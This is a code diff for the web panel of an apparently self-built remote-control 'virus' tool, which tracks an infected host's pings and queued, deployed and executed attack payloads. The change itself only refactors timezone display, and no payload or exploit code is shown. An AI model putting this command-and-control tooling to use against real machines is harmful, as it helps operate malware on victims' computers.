@@ -7,11 +7,10 @@ use Kelvinho\Virus\Attack\AttackFactory;
 use Kelvinho\Virus\Attack\PackageRegistrar;
 use Kelvinho\Virus\Singleton\Header;
 use Kelvinho\Virus\Singleton\HtmlTemplate;
-use Kelvinho\Virus\Singleton\Timezone;
+use Kelvinho\Virus\Timezone\Timezone;
 use Kelvinho\Virus\User\User;
 use function Kelvinho\Virus\filter;
 use function Kelvinho\Virus\formattedHash;
-use function Kelvinho\Virus\formattedTime;
 use function Kelvinho\Virus\initializeArray;
 use function Kelvinho\Virus\map;
 use function Kelvinho\Virus\niceFileSize;
@@ -27,8 +26,9 @@ use function Kelvinho\Virus\niceFileSize;
  * @param User $user
  * @param PackageRegistrar $packageRegistrar
  * @param string $virus_id
+ * @param Timezone $timezoneObject
  */
-function displayTable(array $attack_ids, array $visibleFields, AttackFactory $attackFactory, User $user, PackageRegistrar $packageRegistrar, string $virus_id) {
+function displayTable(array $attack_ids, array $visibleFields, AttackFactory $attackFactory, User $user, PackageRegistrar $packageRegistrar, string $virus_id, Timezone $timezoneObject) {
     if (count($attack_ids) === 0) { ?>
         <p>(No attacks)</p>
     <?php } else { ?>
@@ -44,14 +44,13 @@ function displayTable(array $attack_ids, array $visibleFields, AttackFactory $at
                 </tr>
                 <?php foreach ($attack_ids as $attack_id) {
                     $attack = $attackFactory->get($attack_id);
-                    $timezone = $user->getTimezone();
                     echo "<tr onclick = \"redirect('$attack_id')\" style=\"cursor: pointer;\">";
                     //echo "<tr>";
                     //echo "<a href='" . DOMAIN . "/ctrls/viewVirus?vrs=$virus_id&aks=$attack_id'>";
                     echo in_array(0, $visibleFields) ? "<td>" . $attack->getName() . "</td>" : "";
                     echo in_array(1, $visibleFields) ? "<td>" . $packageRegistrar->getDisplayName($attack->getPackageDbName()) . "</td>" : "";
                     echo in_array(2, $visibleFields) ? "<td>" . formattedHash($attack->getAttackId()) . "</td>" : "";
-                    echo in_array(3, $visibleFields) ? "<td>" . formattedTime($attack->getExecutedTime() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</td>" : "";
+                    echo in_array(3, $visibleFields) ? "<td>" . $timezoneObject->display($user->getTimezone(), $attack->getExecutedTime()) . "</td>" : "";
                     echo in_array(4, $visibleFields) ? "<td>" . niceFileSize($attack->usage()->getStatic()) . "</td>" : "";
                     echo in_array(5, $visibleFields) ? "<td class='w3-right-align'><button class=\"w3-btn w3-teal\" onclick=\"deleteAttack('" . $attack->getAttackId() . "')\">Delete</button></td>" : "";
                     echo "</a></tr>";
@@ -130,7 +129,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
     <div class="w3-col l4 m4 s6">
         <label for="lastPing">Last ping</label>
         <input id="lastPing" class="w3-input" type="text" disabled
-               value="<?php echo formattedTime($virus->getLastPing() + Timezone::getUnixOffset($user->getTimezone())) . " UTC " . $user->getTimezone() . " (Unix timestamp: " . $virus->getLastPing() . ")"; ?>">
+               value="<?php echo $timezone->display($user->getTimezone(), $virus->getLastPing()) . " (Unix timestamp: " . $virus->getLastPing() . ")"; ?>">
     </div>
 </div>
 <br>
@@ -175,21 +174,21 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <div id="message" style="color: red;"></div>
 <h2>Background attacks</h2>
 <h3>Offline</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId()); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
 <h3>Online</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId()); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
 <h2>One time attacks</h2>
 <h3>Dormant attacks</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId()); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
 <h3>Deployed attacks</h3>
 <p>These are attacks that was sent to the virus, but the application hasn't heard a response from it yet. It could
     be that the virus hasn't noticed it yet, or it is executing and it's taking a long time. Or right when the virus
     is downloading the attacks, the internet is dropped and the payload doesn't get downloaded. If a payload stays
     here for more than an hour then this is likely the case. Then you can delete the attacks and start a new one all
     over again.</p>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId()); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
 <h3>Executed attacks</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 3, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId()); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 3, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
 <h2>How to choose?</h2>
 <p>Oh hey, you're the new guy again. Don't know what attack packages to choose from? No worries, here is a quick
     guide.</p>
@@ -360,11 +359,11 @@ $user = $userFactory->get($session->get("user_handle")); ?>
      * Get a graphable 24-element array of {"hours", "label"}
      *
      * @param string $virus_id The virus id
-     * @param int $user_time_zone
+     * @param int $timezoneOffset
      * @param int $startTimeOfDay
      * @return array the graphable array
      */
-    function getDailyTimes(string $virus_id, int $user_time_zone, int $startTimeOfDay = -1) {
+    function getDailyTimes(string $virus_id, int $timezoneOffset, int $startTimeOfDay = -1) {
         // important variables
         if ($startTimeOfDay == -1) {
             $startTimeOfDay = time() - 24 * 3600;
@@ -405,16 +404,16 @@ $user = $userFactory->get($session->get("user_handle")); ?>
         //$hourSliceLabels = [0 => "00:00", 6 => "06:00", 12 => "12:00", 18 => "18:00"];
         $hourSliceLabels = [0 => "00:00", 4 => "04:00", 8 => "08:00", 12 => "12:00", 16 => "16:00", 20 => "20:00"];
         for ($i = 0; $i < 24; $i++) {
-            $graphable[$i] = ["hours" => $data[$i], "label" => @$hourSliceLabels[fixHour($i + $analysisTimeSlice + $user_time_zone)]];
+            $graphable[$i] = ["hours" => $data[$i], "label" => @$hourSliceLabels[fixHour($i + $analysisTimeSlice + ((int) ($timezoneOffset / 3600)))]];
         }
         return $graphable;
     }
     //$graphableDaily = getDailyTimes($virus_id, $user->getTimezone());
-    $graphableDaily = getDailyTimes($virus_id, $user->getTimezone());
+    $graphableDaily = getDailyTimes($virus_id, $timezone->getOffset($user->getTimezone()));
     ?>
     const days = <?php echo "[" . join(", ", map([14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1], function ($daysBack, $index, $data) {
             $startTime = $data["currentTime"] - $daysBack * 24 * 3600;
-            $graphableDaily = getDailyTimes($data["virus_id"], $data["timeZone"], $startTime);
+            $graphableDaily = getDailyTimes($data["virus_id"], $data["timezoneOffset"], $startTime);
             return "{labels: [" . join(", ", map($graphableDaily, function ($element) {
                     return "\"" . $element["label"] . "\"";
                 })) . "], " .
@@ -422,9 +421,9 @@ $user = $userFactory->get($session->get("user_handle")); ?>
                     return min($element["hours"], 1) * 100;
                 })) . "], " .
                 "title: \"" . date("M j", $startTime) . " - " . date("M j", $startTime + 24 * 3600) . "\"}";
-        }, ["currentTime" => time(), "timeZone" => $user->getTimezone(), "virus_id" => $virus_id])) . "];";
+        }, ["currentTime" => time(), "timezoneOffset" => $timezone->getOffset($user->getTimezone()), "virus_id" => $virus_id])) . "];";
 
-        function getMonthlyTimes(string $virus_id, int $user_time_zone) {
+        function getMonthlyTimes(string $virus_id, int $timezoneOffset) {
             // important variables
             $currentTime = time();
             $cycles = 12;// 12 cycles per hour, meaning 5 minutes per cycle
@@ -458,12 +457,11 @@ $user = $userFactory->get($session->get("user_handle")); ?>
                 }
             }
             $graphable = [];
-            for ($i = 0; $i < 24; $i++) {
-                $graphable[$i] = ["hours" => $data[fixHour($i - $analysisTimeSlice - $user_time_zone)]];
-            }
+            for ($i = 0; $i < 24; $i++)
+                $graphable[$i] = ["hours" => $data[fixHour($i - $analysisTimeSlice - ((int) ($timezoneOffset / 3600)))]];
             return $graphable;
         }
-        $graphableMonthly = getMonthlyTimes($virus_id, $user->getTimezone());
+        $graphableMonthly = getMonthlyTimes($virus_id, $timezone->getOffset($user->getTimezone()));
         ?>
 
         chartColors = {
